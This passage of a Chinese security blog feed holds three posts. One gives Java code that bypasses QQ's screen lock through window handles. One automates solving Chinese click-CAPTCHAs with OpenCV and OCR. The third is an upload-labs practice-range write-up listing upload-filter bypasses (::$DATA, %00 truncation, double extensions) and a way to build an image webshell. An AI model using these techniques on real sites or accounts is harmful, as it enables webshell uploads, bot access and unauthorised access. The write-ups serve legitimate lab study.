class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;WinDef.HWND&gt; lt = getQQHwnds();</span><br><span class="line">        <span class="keyword">for</span> (WinDef.HWND hwnd:lt) &#123;</span><br><span class="line">            <span class="keyword">char</span>[] titleBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">512</span>];</span><br><span class="line">            User32.INSTANCE.GetWindowText(hwnd,titleBuffer,<span class="number">512</span>);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> String(titleBuffer));</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">0</span>);<span class="comment">//隐藏</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            User32.INSTANCE.ShowWindow(hwnd,<span class="number">1</span>);<span class="comment">//显示</span></span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;WinDef.HWND&gt; getQQHwnds()&#123;</span><br><span class="line">        <span class="keyword">final</span> List&lt;WinDef.HWND&gt; lt = <span class="keyword">new</span> ArrayList&lt;WinDef.HWND&gt;();</span><br><span class="line"></span><br><span class="line">        User32.INSTANCE.EnumWindows(<span class="keyword">new</span> WinUser.WNDENUMPROC() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">callback</span><span class="params">(WinDef.HWND hwnd, Pointer pointer)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2517368832L</span>||User32.INSTANCE.GetWindowLongPtr(hwnd,User32.GWL_STYLE).longValue()==<span class="number">2248933376L</span>)&#123;</span><br><span class="line">                    lt.add(hwnd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> lt;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先获取到QQ控制面板的句柄，然后依次获取其标题，并进行<code>显示-隐藏-显示</code>等过程。效果如图所示。</p><p><img src="15.gif" alt="1542768137649"></p><blockquote><p>这种成功实现了QQ锁定时自动获取控制面板句柄，实现了QQ锁定的绕过。而且有多个QQ时，都可以获取其句柄。</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在一次偶然的情况下可以绕过QQ锁定，于是就进行了尝试，走了一些弯路，最终实现了这种效果。主要过程就是<code>获取所有顶层窗口句柄-根据窗口样式匹配到QQ控制面板的句柄-使用ShowWindow进行显示</code>。也许这不是最佳的解决方法。如果大家有更好的方法或者建议，欢迎分享。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowlonga</a></p><p>[2]<a href="https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-" target="_blank" rel="noopener">https://java-native-access.github.io/jna/4.2.0/com/sun/jna/platform/win32/User32.html#EnumWindows-com.sun.jna.platform.win32.WinUser.WNDENUMPROC-com.sun.jna.Pointer-</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在使用某抢票软件的时候，由于要设置抢票成功后的通知，就用了QQ通知。结果发现当QQ在锁定时，也可以获取到QQ的控制面板进行操作，竟然绕过了QQ的锁定，于是就去尝试如何实现QQ锁定的绕过。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程之美" scheme="https://fuping.site/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
    
    
      <category term="锁定绕过" scheme="https://fuping.site/tags/%E9%94%81%E5%AE%9A%E7%BB%95%E8%BF%87/"/>
    
      <category term="Windows API" scheme="https://fuping.site/tags/Windows-API/"/>
    
  </entry>
  
  <entry>
    <title>中文点选验证码自动识别</title>
    <link href="https://fuping.site/2018/08/16/Automatically-Identify-Chinese-Point-Selection/"/>
    <id>https://fuping.site/2018/08/16/Automatically-Identify-Chinese-Point-Selection/</id>
    <published>2018-08-16T13:27:36.000Z</published>
    <updated>2018-08-20T14:19:46.605Z</updated>
    
    <content type="html"><![CDATA[<p>某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。</p><a id="more"></a><h2 id="0x01-验证码的获取"><a href="#0x01-验证码的获取" class="headerlink" title="0x01  验证码的获取"></a>0x01  验证码的获取</h2><p>首先获取验证码。由于网站比较特殊，就不以他们的为例，自己生成验证码吧。这个不是重点，这里直接贴代码了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createImage</span><span class="params">($word,$imagePath,$type,$imageName)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $fontPath = <span class="string">'msyh.ttc'</span>;<span class="comment">//字体</span></span><br><span class="line">    $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($word <span class="keyword">as</span> $v ) &#123;</span><br><span class="line">        $fontarea  = imagettfbbox($fontSize, <span class="number">0</span>, $fontPath, $v);</span><br><span class="line">        $textWidth = $fontarea[<span class="number">2</span>] - $fontarea[<span class="number">0</span>];</span><br><span class="line">        $textHeight = $fontarea[<span class="number">1</span>] - $fontarea[<span class="number">7</span>];</span><br><span class="line">        $tmp[<span class="string">'text'</span>] = $v;</span><br><span class="line">        $tmp[<span class="string">'size'</span>] = $fontSize;</span><br><span class="line">        $tmp[<span class="string">'width'</span>] = $textWidth;</span><br><span class="line">        $tmp[<span class="string">'height'</span>] = $textHeight;</span><br><span class="line">        $textArr[] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($imageWidth, $imageHeight, $imageType) = getimagesize($imagePath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($textArr);$i++)&#123;</span><br><span class="line">        <span class="keyword">list</span>($x, $y) = randPosition($textArr, $imageWidth, $imageHeight, $textArr[$i][<span class="string">'width'</span>], $textArr[$i][<span class="string">'height'</span>],$i,$type);</span><br><span class="line">        $textArr[$i][<span class="string">'x'</span>] = $x;</span><br><span class="line">        $textArr[$i][<span class="string">'y'</span>] = $y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建图片的实例</span></span><br><span class="line">    $image = imagecreatefromstring(file_get_contents($imagePath));</span><br><span class="line">    <span class="comment">//字体颜色</span></span><br><span class="line">    $color = imagecolorallocate($image, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//绘画文字</span></span><br><span class="line">    <span class="keyword">foreach</span>($textArr <span class="keyword">as</span> $v)&#123;</span><br><span class="line">        imagefttext($image, $v[<span class="string">'size'</span>], <span class="number">0</span>, $v[<span class="string">'x'</span>], $v[<span class="string">'y'</span>], $color, $fontPath, $v[<span class="string">'text'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(imagepng($image,$imageName))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $imageName.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randPosition</span><span class="params">($textArr, $imgW, $imgH, $fontW, $fontH,$i,$type)</span></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> ($type) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//生成mp</span></span><br><span class="line">$x = rand($i*<span class="number">60</span>, ($i+<span class="number">1</span>)*<span class="number">60</span>-$fontW<span class="number">-3</span>);</span><br><span class="line">$y = rand(<span class="number">40</span>,<span class="number">80</span>); </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//生成ap</span></span><br><span class="line">$x = ($i)*<span class="number">25</span>+<span class="number">5</span>;</span><br><span class="line">$y = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $return = <span class="keyword">array</span>($x, $y);</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ap_imagePath = <span class="string">'ap_bg.png'</span>;</span><br><span class="line">$mp_imagePath = <span class="string">'mp_bg.png'</span>;</span><br><span class="line">$ap_imageName = <span class="string">"ap_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$mp_imageName = <span class="string">"mp_"</span>.time().<span class="string">".png"</span>;</span><br><span class="line">$ap_word = <span class="keyword">array</span>(<span class="string">'请'</span>,<span class="string">'依'</span>,<span class="string">'次'</span>,<span class="string">'点'</span>,<span class="string">'击'</span>,<span class="string">'图'</span>,<span class="string">'中'</span>,<span class="string">'的'</span>,<span class="string">'猎'</span>, <span class="string">'户'</span>,<span class="string">'室'</span>) ;</span><br><span class="line">$mp_word = <span class="keyword">array</span>(<span class="string">'猎'</span>, <span class="string">'户'</span>, <span class="string">'实'</span>,<span class="string">'验'</span>,<span class="string">'室'</span>);</span><br><span class="line">createImage($ap_word,$ap_imagePath,<span class="number">1</span>,$ap_imageName);</span><br><span class="line">createImage($mp_word,$mp_imagePath,<span class="number">0</span>,$mp_imageName);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后生成这样两张图片。</p><p>ap_XXXXX.png</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5Cap-01.png" alt="1534127745391"></p><p>mp_XXXXX.png</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5Cmp-01.png" alt="1534127785857"></p><p>ap_XXXXX.png是说明需要点击的文字，mp_XXXXX.png是需要点击的图片。</p><h2 id="0x02-验证码识别"><a href="#0x02-验证码识别" class="headerlink" title="0x02  验证码识别"></a>0x02  验证码识别</h2><p>对于这种简单的点选验证码，可以有两种很容易的识别方式（机器学习算麻烦的，这里就不列出了。嗯，对，我也不会）。一种是opencv的图像模板匹配，另外一种是OCR识别。</p><h3 id="1-opencv的图像模板匹配"><a href="#1-opencv的图像模板匹配" class="headerlink" title="1. opencv的图像模板匹配"></a>1. opencv的图像模板匹配</h3><p>第一种方式，使用opencv的图像模板匹配。模板匹配是一种在较大图像中搜索和查找模板图像位置的方法，opencv2和opencv3中提供了一个专门用于模板匹配的函数matchTemplate()。它是在输入图像上滑动模板图像（如在2D卷积中），并比较模板图像下的输入图像的模板和补丁。在OpenCV中实现了六种比较方法（这里用到的是<code>cv2.TM_CCOEFF_NORMED</code>），它返回一个灰度图像，其中每个像素表示该像素的邻域与模板匹配的程度。</p><p>获得结果后，可以使用cv.minMaxLoc（）函数查找最大/最小值的位置。将其作为矩形的左上角，并将（w，h）作为矩形的宽度和高度，那个矩形就是模板区域。 。</p><p>我们进行使用模板匹配来识别这种验证码时，首先先将“模板”找出来，这里我们需要匹配的是“猎”、“户”、“室”这三个字。将这三个字所在的图片进行截取，然后使用matchTemplate()函数在mp中进行匹配。</p><p>首先截取第一个字“猎”。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534141199627.png" alt="1534141199627"></p><p>截取之后，就可以在mp中进行匹配。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534319979597.png" alt="1534319979597"></p><p>这里得到了最大和最小位置。我们使用最大位置，然后将最大值作为阈值。获取模板的尺寸，然后在mp中用矩形（红色区域）画出匹配的区域。如下所示。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534142377712.png" alt="1534142377712"></p><p>同理，用黄色和蓝色矩形将“户”、“室”所在的区域画出来。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534142664129.png" alt="1534142664129"></p><p>点选时发送所选区域中间的坐标即可，这里就不再给出实例了。</p><p>这种方法虽然简单，但是对于字体不一的就不能很正确的标记出来。</p><p>修改生成图片的代码，将mp中的文字的字体设置为随机。</p><p>修改的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//mp 文字随机大小</span></span><br><span class="line">        $fontSize = rand(<span class="number">20</span>,<span class="number">30</span>) * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//ap 文字固定</span></span><br><span class="line">        $fontSize = <span class="number">20</span> * <span class="number">0.75</span>;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ap生成的结果还是和之前一样，mp的图片如下：</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534406354140.png" alt="1534406354140"></p><p>使用同样的代码来匹配。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534406412351.png" alt="1534406412351"></p><p>此时匹配的结果就有些惨不忍睹了。所以就换另外一种识别方式-ocr识别。</p><h3 id="2-OCR识别"><a href="#2-OCR识别" class="headerlink" title="2. OCR识别"></a>2. OCR识别</h3><p>这里采用的是腾讯云的<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">OCR-通用印刷体识别</a>。</p><p>参考文档。输入mp图片，返回的是json。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534407226287.png" alt="1534407226287"></p><p>查看json内容，发现包含了图片中的文字、位置和大小等。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534407260832.png" alt="1534407260832"></p><p>同理ap中内容也可以获取。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534407371139.png" alt="1534407371139"></p><p>此时匹配的时候直接就是匹配文字了。首先获取ap中后三个文字，然后与mp中返回的内容匹配，获取其位置和大小，然后再画矩形即可。</p><p>由于比较简单，这里直接贴结果。</p><p><img src="Automatically-Identify-Chinese-Point-Selection%5C1534408948730.png" alt="1534408948730"></p><p>匹配相当完美。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h2><p>本文用了两种方法来自动识别汉字点选验证码，第一种采用的是opencv的模板匹配，这种方法虽然也可以匹配到，但这种方法缺点就是对于字体形状差异较大的验证码识别率较低。而第二种方法就比较快捷方便了，而且识别度高，比较推荐第二种方法。</p><p>当然这两种方法对于简单、“正规”的验证码可以，遇到复杂的、“扭曲的”验证码就不行了。这时候就要用到机器学习了，而本文只是简单的“识别”，将机器学习用到这里，就有些大材小用了。</p><p>相关代码：<a href="https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/tree/master/captcha/Pointselection</a></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p>[1] <a href="http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html" target="_blank" rel="noopener">http://bluewhale.cc/2017-09-22/use-python-opencv-for-image-template-matching-match-template.html</a></p><p>[2]<a href="https://cloud.tencent.com/document/product/866/17600" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/866/17600</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;某次测试中遇到了汉字点选的验证码，看着很简单，尝试了一下发现有两种简单的识别方法，终于有空给重新整理一下，分享出来。&lt;/p&gt;
    
    </summary>
    
    
      <category term="验证码识别" scheme="https://fuping.site/categories/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
    
      <category term="点选验证码" scheme="https://fuping.site/tags/%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
      <category term="验证码识别" scheme="https://fuping.site/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs writeup</title>
    <link href="https://fuping.site/2018/06/04/upload-labs-writeup/"/>
    <id>https://fuping.site/2018/06/04/upload-labs-writeup/</id>
    <published>2018-06-04T02:25:58.000Z</published>
    <updated>2018-06-04T15:39:30.629Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里用到的是PHPStudy2016。采用的是Apache+php，其中Apache版本为2.4，php版本按照作者所说的为5.2.17。操作系统为Win10 。然后下载upload-labs并放置在PHPStudy安装目录的WWW目录下。也可以采用作者的<a href="https://github.com/c0ny1/upload-labs/releases" target="_blank" rel="noopener">集成环境</a>。</p><h2 id="题目与解法"><a href="#题目与解法" class="headerlink" title="题目与解法"></a>题目与解法</h2><p>首先需要在upload-labs目录下新建upload目录。</p><p>然后就开始答题了。其中13-16暂时要求的是“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”，我就暂时以13题为例，其余的暂时先不做。第18题暂未解出，所以暂时先省略。</p><p>其他题的WriteUp如下：</p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>在js中判断文件，直接上传拦截后修改为php文件</p><p><img src="upload-labs-writeup%5C01.png" alt="1527750911228"></p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p><img src="upload-labs-writeup%5C02.png" alt="1527751110894"></p><blockquote><p>注意需要带上<code>Content-Type: image/jpeg</code></p></blockquote><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>首先名字为<code>3.php:jpg</code></p><p><img src="upload-labs-writeup%5C03_01.png" alt="1527752035450"></p><p>会写入一个<code>3.php</code>的空文件</p><p>然后修改名字为<code>3.&lt;&lt;&lt;</code></p><p><img src="upload-labs-writeup%5C03_02.png" alt="1527752164570"></p><p>参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>需要在apache httpd.conf进行配置。</p><p><code>AddType application/x-httpd-php .php .phtml</code></p><p>然后上传的文件名可以为<code>3.php.a</code>或者<code>3.phtml</code></p><p><img src="upload-labs-writeup%5C03_03.png" alt="1527832795973"></p><blockquote><p>这个解法是查看到作者给的集成环境中有这样的设置</p></blockquote><h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p><img src="upload-labs-writeup%5C03-04.png" alt="1527836221197"></p><p>首先文件名为<code>3.php.::$DATA</code>会生成一个<code>3.php.</code>文件</p><p>再将文件名修改为<code>3.php&gt;</code></p><p><img src="upload-labs-writeup%5C03-05.png" alt="1527835503648"></p><blockquote><p>第二次的文件名还可以为<code>3.php&lt;</code> 、<code>3.php&gt;</code> 、<code>3.php\</code> 以及<code>3.php&quot;</code></p><p>3.php.文件直接删除不掉，可以在bash命令下删除</p></blockquote><h4 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h4><p>%aa url解码</p><p><img src="upload-labs-writeup%5C03-06.png" alt="1527839239501"></p><p>其他还有%b3、%b2等。。</p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>参考Pass-03的方法1、2、3、4</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有对文件名进行小写转换，所以大小写混合或者大写可以绕过</p><p><img src="upload-labs-writeup%5C05-02.png" alt="1527840876449"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>参考Pass-03的方法1、2、3、4</p><p>这里没有去除空格，所以用“6.php ”即可绕过</p><p><img src="upload-labs-writeup%5C06-02.png" alt="1528077233962"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有删除结尾的“.”，所以用“7.php.”可以绕过</p><p><img src="upload-labs-writeup%5C07-01.png" alt="1528077415251"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>参考Pass-03的方法1、2、3、4</p><p>没有对字符串<code>::$DATA</code>进行操作，所以可以使用<code>8.php::$DATA</code>绕过</p><p><img src="upload-labs-writeup%5C08-01.png" alt="1527841099446"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>参考Pass-03的方法1、2、3、4</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>关键代码<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。</p><p><img src="upload-labs-writeup%5C10-01.png" alt="1527833585243"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>%00截断即可</p><p>需关闭magic_quotes_gpc</p><p><img src="upload-labs-writeup%5C11-01.png" alt="1527816997321"></p><blockquote><p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p></blockquote><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>%00截断即可，需要url解码</p><p>需关闭magic_quotes_gpc</p><p><img src="upload-labs-writeup%5C12-01.png" alt="1527817083878"></p><blockquote><p>集成环境中有该设置：<code>magic_quotes_gpc = Off</code></p></blockquote><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>题目已经更新，要求“保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码 ”</p><p>这里就以png格式图片为例</p><p><code>copy xwz.png/b + 1.txt 1111.png</code></p><p>其中xwz.png为正常的png图片，1.txt内容为<code>&lt;?php echo &quot;pwn&quot;;?&gt;</code></p><p>查看上传后的结果</p><p><img src="upload-labs-writeup%5C13-01.png" alt="1528079960735"></p><p>当然也可以直接用hex工具打开图片，在最后追加php代码。</p><blockquote><p>14-16和该题要求类似，统一按该方法处理。步骤省略。</p></blockquote><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>参考Pass-03方法1</p><p>文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传</p><p><img src="upload-labs-writeup%5C17-01.png" alt="1528080850165"></p><p><img src="upload-labs-writeup%5C17-02.png" alt="1528080900372"></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>save_name修改为“upload-19.php.”即可</p><p><img src="upload-labs-writeup%5C19-01.png" alt="1528081520987"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里面比较通杀的方法是采用<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容。可以参考<a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a>这篇文章，里面介绍的很详细。</p><p>本文主要用到的绕过方式有：</p><ol><li><p>修改js绕过（或者上传图片格式后抓包修改）</p></li><li><p>利用文件名<code>aaa.php:jpg</code> 的方法生成一个<code>aaa.php</code>的空文件，然后使用<code>aaa.&lt;&lt;&lt;</code>再次写入文件内容</p></li><li><p>使用<code>3.php::$DATA</code> 绕过</p></li><li><p>文件名进行小写绕过</p></li><li><p>“abc.php.” 绕过</p></li><li><p>“abc.pphphp”绕过</p></li><li><p>%00截断绕过</p></li><li><p>URL解码绕过（参考Pass-03)方法4</p></li></ol><p>本文只是给了部分解题的答案，没有过多的描述思路。每道题的解法也不是那么单一固定的。其中Pass-03到Pass-09都可以利用Pass-03的四种方法。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p></li><li><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">https://www.waitalone.cn/php-windows-upload.html</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/c0ny1/upload-labs&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;upload-labs&lt;/a&gt;是一个总结了大部分PHP上传漏洞的靶场 ，本文主要是记录一下这些常见上传漏洞的绕过方法。当然一种漏洞会有多种绕过的方法，这里暂时列举一些我所知道的解法。有些会有环境限制的，我会在其中备注出来的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="PHP" scheme="https://fuping.site/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>UEditor SSRF漏洞(JSP版本)分析与复现</title>
    <link href="https://fuping.site/2018/05/25/UEditor-SSRF-In-JSP/"/>
    <id>https://fuping.site/2018/05/25/UEditor-SSRF-In-JSP/</id>
    <published>2018-05-25T00:37:15.000Z</published>
    <updated>2018-05-25T03:16:02.291Z</updated>
    
